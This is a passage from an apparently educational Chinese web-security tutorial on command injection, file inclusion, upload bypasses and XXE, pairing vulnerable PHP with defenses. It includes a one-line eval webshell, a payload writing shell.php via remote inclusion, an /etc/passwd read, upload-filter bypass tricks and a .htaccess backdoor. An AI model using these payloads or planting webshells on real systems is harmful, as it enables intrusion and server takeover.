    <span class="token string single-quoted-string">';'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'&amp;'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">''</span><span class="token operator">.</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token function">array_keys</span><span class="token punctuation">(</span><span class="token variable">$substitutions</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$substitutions</span><span class="token punctuation">,</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ls'</span><span class="token operator">.</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>白名单限制输入</li>
</ul>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">is_ip</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'.'</span><span class="token punctuation">,</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">&gt;</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>谨慎使用<code>eval</code>等可能引起命令执行函数</li>
<li>对用户输入的参数进行过滤，如<code>escapeshellarg()</code>,<code>escapeshellcmd()</code>过滤转码</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">&lt;?php
	$ip=$_GET['ip']
	$target = escapeshellarg($ip);
	$cmd="ping -c 3 $target";
	echo $cmd;
	system($cmd);
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>参数尽量使用引号进行包裹，拼接前用<code>addslashes()</code>转义（对引号那些转义）</li>
</ul>
<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><h4 id="原理-13"><a href="#原理-13" class="headerlink" title="原理"></a>原理</h4><p>服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行，这会为开发者节省大量的时间。</p>
<p>文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。</p>
<p><strong>常见函数：</strong>include();</p>
<p><strong>原理：</strong>使用这些函数包含一个新文件时，文件将作为php代码执行，php并不在意包含文件的类型。</p>
<p><strong>危害：</strong></p>
<ul>
<li>读取敏感数据</li>
<li>远程包含shell</li>
<li>基于php封装读取源码</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span> php
	<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<ul>
<li><p>本地文件：构建<code>?test=/etc/passwd</code>获取文件内容</p>
</li>
<li><p>远程文件：<code>?test=ip/code.txt</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"shell.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"W"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&lt;?php eval(<span class="token interpolation"><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'shell'</span><span class="token punctuation">]</span></span>);?&gt;"</span><span class="token punctuation">)</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>php源码：<code>?test=php://</code>文件</p>
</li>
</ul>
<h4 id="防御-12"><a href="#防御-12" class="headerlink" title="防御"></a>防御</h4><ul>
<li>设置白名单：</li>
</ul>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$file_list</span><span class="token operator">=</span><span class="token punctuation">[</span>                       <span class="token comment">//声明一个变量，用于存放白名单；</span>
  <span class="token string single-quoted-string">'framework/init.php'</span><span class="token punctuation">,</span>
  <span class="token string single-quoted-string">'framework/route.php'</span><span class="token punctuation">,</span>
  <span class="token string single-quoted-string">'framework/event.php'</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$file</span><span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
<span class="token comment">//声明一个变量，用于接收传递过来的文件信息；</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token variable">$file_list</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  
<span class="token comment">//把传递过来的文件信息和白名单里面的文件进行对比；</span>
  <span class="token keyword">include</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$file</span></span>"</span><span class="token punctuation">;</span>
 <span class="token comment">//如果传递过来的文件是白名单里面的文件，就对它进行文件包含；</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>过滤危险字符</li>
</ul>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$pattern</span><span class="token operator">=</span> <span class="token string double-quoted-string">"#^[a-z][a-z0-9+.]*:?//#i"</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string single-quoted-string">'.php'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".."</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">false</span><span class="token operator">&amp;&amp;</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
<span class="token keyword">include</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$file</span></span>"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>设置文件目录（配置php.ini)</li>
</ul>
<p>PHP配置文件中有open_basedir选项可以设置用户需要执行的文件目录，如果设置目录的话，PHP仅仅在该目录内搜索文件。</p>
<ul>
<li>关闭危险配置（配置php.ini)</li>
</ul>
<p>PHP配置中的allow_url_include选项如果打开，PHP会通过Include/Require进行远程文件包含，由于远程文件的不可信任性及不确定性，在开发中禁止打开此选项，PHP默认是关闭的。</p>
<ul>
<li>静态写入</li>
<li>对路径，参数，文件进行验证</li>
</ul>
<h3 id="文件上传与文件解析"><a href="#文件上传与文件解析" class="headerlink" title="文件上传与文件解析"></a>文件上传与文件解析</h3><h4 id="原理-14"><a href="#原理-14" class="headerlink" title="原理"></a>原理</h4><p><strong>文件上传漏洞的原理：</strong></p>
<p>文件上传漏洞的产原因在于程序员对于用户上传的文件内容控制不足或处理存在缺陷，从而导致的用户可以越过其本身权限向服务器上传可执行的脚本文件。</p>
<p><strong>文件上传漏洞的危害：</strong></p>
<p>（1）上传webshell,控制服务器、远程命令执行</p>
<p>（2）上传系统病毒、木马文件进行挖矿、僵尸网络</p>
<p>（3）进行提权操作</p>
<p>（4）修改web页面，实现钓鱼、挂马等操作。</p>
<p>（5）进行内网渗透。</p>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><h5 id="无验证"><a href="#无验证" class="headerlink" title="无验证"></a>无验证</h5><p>直接上传一句话木马或者WebShell脚本即可。、</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h5 id="客户端检测（Javascript检测）"><a href="#客户端检测（Javascript检测）" class="headerlink" title="客户端检测（Javascript检测）"></a>客户端检测（Javascript检测）</h5><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;script type="text/javascript"&gt;
    function checkFile() {
        var file = document.getElementsByName('upload_file')[0].value;
        if (file == null || file == "") {
            alert("请选择要上传的文件!");
            return false;
        }
        //定义允许上传的文件类型
        var allow_ext = ".jpg|.png|.gif";
        //提取上传文件的类型
        var ext_name = file.substring(file.lastIndexOf("."));
        //判断上传文件类型是否允许上传
        if (allow_ext.indexOf(ext_name) == -1) {
            var errMsg = "该文件不允许上传，请上传" + allow_ext + "类型的文件,当前文件类型为：" + ext_name;
            alert(errMsg);
            return false;
        }
    }
&lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>客户端检测（Javascript检测）</p>
<p>在网页上写一段Javascript脚本，效验文件上传的后缀名，有白名单形式也有黑名单形式。如果上传文件的后缀不被允许，则会弹窗告知，此时文件上传的数据包并没有发送到服务端，只是在客户端浏览器使用Javascript对数据包进行检测。</p>
<p>这时有两种方法可以绕过客户端Javascript的检测：</p>
<blockquote>
<ul>
<li>使用浏览器插件，删除检测文件后缀的Javascript代码，然后上传文件即可绕过</li>
<li>首先把需要上传的文件后缀改成允许上传的文件类型，如jpg、png、gif等，绕过Javascript检测，再抓包，把后缀名改成可执行文件的后缀即可上传成功</li>
</ul>
</blockquote>
<h5 id="服务端检测（MINE类型检测）"><a href="#服务端检测（MINE类型检测）" class="headerlink" title="服务端检测（MINE类型检测）"></a>服务端检测（MINE类型检测）</h5><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;?php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name'];          
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '文件类型不正确，请重新上传！';
        }
    } else {
        $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！';
    }
}
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>服务器代码判断$_FILES[”file“][“type”]是不是图片格式（<code>image/jpeg</code>、<code>image/png</code>、<code>image/gif</code>），如果不是，则不允许上传该文件。</p>
<p>绕过方法：</p>
<p>抓包后更改Content-Type为允许的类型绕过该代码限制，比如将php文件的<code>Content-Type:application/octet-stream</code>修改为<code>image/jpeg</code>、<code>image/png</code>、<code>image/gif</code>等就可以</p>
<h5 id="服务端检测（文件扩展名检测）黑名单"><a href="#服务端检测（文件扩展名检测）黑名单" class="headerlink" title="服务端检测（文件扩展名检测）黑名单"></a>服务端检测（文件扩展名检测）黑名单</h5><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;?php
include '../config.php';
include '../common.php';
include '../head.php';
include '../menu.php';

$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array('.asp','.aspx','.php','.jsp');
		//$deny_ext = array(".php",".php5",".php4",".php3",".php2",".php1",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".pHp1",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".ini");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.'); //查找字符串在另一个字符串中最后一次出现的位置,并返回从该位置到字符串结尾的所有字符。就是后面后缀
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_replace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空

        if(!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;            
            if (move_uploaded_file($temp_file,$img_path)) {
                 $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li><code>in_array()</code>判断数组中是否存在某个值。</li>
<li><code>rand(1000，9999).$file_ext</code>随机命名。.</li>
<li><code>deldot()</code>：去文件名末尾的点。防止后面加<code>.</code>绕过</li>
<li><code>strrchr()</code>：查找字符在指定字符串中从右面开始的第一次出现的位置，如果成功，返回该字符以及其后面的字符，获取后缀。</li>
<li><code>strtolower()</code>：以小写字符返回指定字符串。防止大小写绕过</li>
<li><code>str_replace()</code>：使用一个字符串替换字符串中的另一些字符。这里目的是删去<code>::$DATA</code>，但是由于Windows的特性在磁盘中会忽略<code>::$DATA</code>并将文件新建。在浏览器中拼接文件路径并去掉<code>::$DATA</code>后访问，可以看到文件内容成功被执行。</li>
<li><code>trim()</code>：除了单词之间的单个空格外，清除文本中所有的空格,后面加空格绕过<code> </code></li>
</ul>
<p><strong>绕过方法：</strong></p>
<ul>
<li><p>文件名大小写绕过，如：<code>*.pHp</code> <code>*.aSP</code>，<code>php3</code>,<code>php5</code></p>
<blockquote>
<p>符合的后缀包括 php、php3、php4、php5、phtml、pht等</p>
</blockquote>
</li>
<li><p>文件名双写绕过，如：<code>*.pphphp</code></p>
</li>
<li><p>没有对后缀名进行去”::<code>$DATA”处理，利用windows特性，可在后缀名中加” ::$DATA”</code>绕过：</p>
</li>
<li><p>Unicode： 当目标存在json_decode且检查在json_decode之前,可以将php写为<code>\u0070hp</code></p>
</li>
<li><p>名单列表绕过，如：<code>*.asa</code> <code>*.cer</code></p>
</li>
<li><p>特殊文件名绕过，比如windows文件名最后不能有.或空格，可设为<code>*.php.</code>或<code>*.php+</code></p>
</li>
<li><p>0x00截断绕过，比如：<code>*.php(0x00).jpg</code> 或 <code>*.php%00.jpg</code></p>
</li>
<li><p>文件包含漏洞</p>
</li>
<li><p>服务器解析漏洞</p>
</li>
<li><p>.htaccess文件攻击</p>
</li>
</ul>
<blockquote>
<p>一般<code>.htaccess</code>可以用来留后门和针对黑名单绕过。在上传网站的根目录下，上传一个<code>.htaccess</code>文件即可。</p>
<pre class="line-numbers language-none"><code class="language-none">//.htaccess  修改文件
&lt;FilesMatch “4.jpg”&gt;
SetHandler application/x-httpd-php
&lt;/FilesMatch&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>上传4.jpg就可以</p>
<p>也可以</p>
<p>后缀名冗余(未知拓展名绕过)绕过，例如修改成one.php.aaa、one.php.xxxx等。、</p>
</blockquote>
<p>后面的大部分也是这</p>
<ul>
<li>还是黑名单，但是没有对后缀名进行去空处理，可在后缀名中加空绕过：</li>
</ul>
<h4 id="防御-13"><a href="#防御-13" class="headerlink" title="防御"></a>防御</h4><ul>
<li>文件扩展名服务端白名单效验</li>
</ul>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'.png'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'.jpg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
 
 <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>如果需要保留文件名，可以修改程序源代码，替换上传文件名中的“.”为“_”：</li>
</ul>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span>’<span class="token operator">.</span>’<span class="token punctuation">,</span> ‘<span class="token constant">_</span>’<span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ul>
<li>文件内容服务端效验</li>
<li>上传文件重命名</li>
<li>隐藏上传文件路径</li>
<li>限制相关目录的执行权限，防范WebShell攻击</li>
<li>uniqid(prefix,more_entropy)):基于微秒计的当前时间，生成一个唯一的ID</li>
<li>md5(uniqid().Suploaded_name):使用MD5对uniqid()函数生成唯一id进行重命<br>名，可以防护00截断攻击</li>
<li>限制上传文件大小</li>
<li>通过Imagecreatefromjpeg()和imagecreatefrompng()函数将上传文件重新写入个新的图片文件中，抹除图片中的有害元数据</li>
<li>imagedestory(Simg)将上传的原文件删除</li>
<li>unlink(temp_file)删除过滤过程中产生的任何临时文件</li>
</ul>
<pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;?php

if( isset( $_POST[ 'Upload' ] ) ) {
	// Check Anti-CSRF token
	checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );


	// File information
	$uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
	$uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);
	$uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
	$uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];
	$uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];

	// Where are we going to be writing to?
	$target_path   = DVWA_WEB_PAGE_TO_ROOT . 'hackable/uploads/';
	//$target_file   = basename( $uploaded_name, '.' . $uploaded_ext ) . '-';
    //MD5重命名
	$target_file   =  md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext;
	$temp_file     = ( ( ini_get( 'upload_tmp_dir' ) == '' ) ? ( sys_get_temp_dir() ) : ( ini_get( 'upload_tmp_dir' ) ) );
	$temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext;

	// Is it an image?
    //限制文件大小和文件名校验
	if( ( strtolower( $uploaded_ext ) == 'jpg' || strtolower( $uploaded_ext ) == 'jpeg' || strtolower( $uploaded_ext ) == 'png' ) &amp;&amp;
		( $uploaded_size &lt; 100000 ) &amp;&amp;
		( $uploaded_type == 'image/jpeg' || $uploaded_type == 'image/png' ) &amp;&amp;
		getimagesize( $uploaded_tmp ) ) {

		// Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)
        // 抹除有害源数据
		if( $uploaded_type == 'image/jpeg' ) {
			$img = imagecreatefromjpeg( $uploaded_tmp );
			imagejpeg( $img, $temp_file, 100);
		}
		else {
			$img = imagecreatefrompng( $uploaded_tmp );
			imagepng( $img, $temp_file, 9);
		}
        //删除用户上传文件
		imagedestroy( $img );

		// Can we move the file to the web root from the temp folder?
		if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) {
			// Yes!
			$html .= "&lt;pre&gt;&lt;a href='${target_path}${target_file}'&gt;${target_file}&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;";
		}
		else {
			// No
			$html .= '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;';
		}

		// Delete any temp files
        //删除临时文件
		if( file_exists( $temp_file ) )
			unlink( $temp_file );
	}
	else {
		// Invalid file
		$html .= '&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;';
	}
}

// Generate Anti-CSRF token
generateSessionToken();

?&gt;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h3><h4 id="原理-15"><a href="#原理-15" class="headerlink" title="原理"></a>原理</h4><p><strong>什么是XXE：</strong>如果可以上传XML文档或在XML文档中添加恶意内容，通过易受攻击的代码、依赖项，攻击者就能够攻击含有缺陷的XML处理器。</p>
<p><strong>XXE攻击的后果：</strong>攻击者可以利用外部实体窃取使用URI文件处理器的内部文件和共享文件、监听内部扫描端口、执行远程代码和实施DoS攻击。</p>
<blockquote>
<p>使用不安全的XML解析函数，SimpleXMLElement、simplexml_load_string函数解析body</p>
</blockquote>
<h4 id="XML结构介绍-1"><a href="#XML结构介绍-1" class="headerlink" title="XML结构介绍"></a>XML结构介绍</h4><p><strong>什么是XML：</strong>可拓展标记语言，类似HTML，设计宗旨时传输数据，而非显示数据，XML标签没有被预定义。需要自行定义标签。</p>
<p><strong>XML文档包含：</strong>XML声明、DTD文档类型定义（可选）、文档元素。</p>
<p><strong>XXE实体分类：</strong>字符实体、命名实体、参数实体、外部实体</p>
<p>实体分类：</p>
<ul>
<li><p>字符实体：由XML规范预先定义好了</p>
<p>| 实体引用 | 字符 |<br>| :———: | :—: |<br>|   &amp;lt    |  &lt;   |<br>|   &amp;gt    |  &gt;   |<br>|   &amp;amp   |  &amp;   |<br>|  &amp;quot   |  “   |<br>|  &amp;apos   |  ‘   |</p>
</li>
<li><p><strong>命名实体</strong>与数字字符实体类似，只是将数字改为一个更容易记忆的英文标识.其中<code>&lt;!ENTITY... &gt;</code>表示实体声明，<code>&lt;!ENTITY &gt;</code>就是对一大段内容的引用，可以简化代码的复用。</p>
<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token comment">&lt;!-- XML声明 --&gt;</span>
<span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">root</span> <span class="token punctuation">[</span><span class="token internal-subset">
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">x</span> <span class="token attr-name">"CUMT"</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">y</span> <span class="token attr-name">"bxs"</span><span class="token punctuation">&gt;</span></span>
</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;x;">&amp;x;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>y</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;y;">&amp;y;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>y</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ul>
<ul>
<li><p>参数实体</p>
<p><strong>combine.dtd</strong></p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!ENTITY content "%param1;%param2;%param3"&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><strong>xml</strong></p>
<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token comment">&lt;!-- XML声明 --&gt;</span>
<span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">root</span> <span class="token punctuation">[</span><span class="token internal-subset">
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">param1</span> <span class="token attr-name">"CUMT"</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">param2</span> <span class="token attr-name">"bxs"</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">param3</span> <span class="token attr-name">"bxs"</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">dtd</span> <span class="token attr-name">STSTEM</span> <span class="token attr-name">"combine.dtd"</span><span class="token punctuation">&gt;</span></span>
	%dtd
</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
